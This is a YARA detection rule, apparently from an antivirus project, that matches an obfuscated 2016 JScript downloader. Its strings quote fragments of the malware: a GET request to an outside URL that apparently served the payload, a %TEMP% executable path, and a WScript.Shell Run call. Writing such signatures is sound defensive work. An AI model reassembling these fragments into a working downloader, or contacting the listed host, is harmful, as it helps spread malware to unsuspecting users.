rule sig_20160329_e3815e98e51535e3f93d53aa1cdc7b95 {
  meta:
    description = "datamaliciousorder - file 20160329_e3815e98e51535e3f93d53aa1cdc7b95.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cfe63a50713b992180b92525174c738d7b5ab03e2c3f2eb1a76906096f1d1fd8"

  strings:
    $s1  = "function Ndbwpuvvf() {return Pbfwasrwkd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"1frlhtwxspf34vz.exe\";};" fullword ascii
    $s2  = "Pmkwgqbwiz[Vnpoenx](\"GET\", \"http://santhiyasreetrading.com/j5ysdla\", false);" fullword ascii
    $s3  = "do {WScript[Nbgxauw](Nkmoupnwv() * 11)} while (Pmkwgqbwiz[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Pbfwasrwkd = function Vrtiwhzvu() {return WScript[Tngfzn](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ipytpuau(Ruzjtztmz, Bkrpo){return Ruzjtztmz - Bkrpo;};" fullword ascii
    $s6  = "function Ibupiwcpv() {return ((Ehreufgwa == true) && (Ehreufgwa == Txtvth)) ? 1 : Ifkyr;};" fullword ascii
    $s7  = "function Rrkgd(Xbkcuefzie){Pbfwasrwkd[\"Run\"](Xbkcuefzie, Ifkyr, Ifkyr);};" fullword ascii
    $s8  = "var Bmzqy = new this[\"Date\"]();" fullword ascii
    $s9  = "Txtvth = true; " fullword ascii
    $s10 = " while (Djuxatsw){" fullword ascii
    $s11 = "var Bajmwbdiut = false;" fullword ascii
    $s12 = "Ehreufgwa = true; " fullword ascii
    $s13 = "function Nkmoupnwv(){return 22;};" fullword ascii
    $s14 = "function Tizjs(){return Uirhwpot;};" fullword ascii
    $s15 = "function Xncpm()" fullword ascii
    $s16 = "return Ipytpuau(Mokzz, Vioiznbn);" fullword ascii
    $s17 = "function Kywpq(Gsjeeyfd) {var Jkqodk = (1, 2, 3, 4, 5, Gsjeeyfd); return Jkqodk;};" fullword ascii
    $s18 = "var Ehreufgwa = false;" fullword ascii
    $s19 = "var Txtvth = false;" fullword ascii
    $s20 = "function Rwcpwt(){return Tngfzn;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}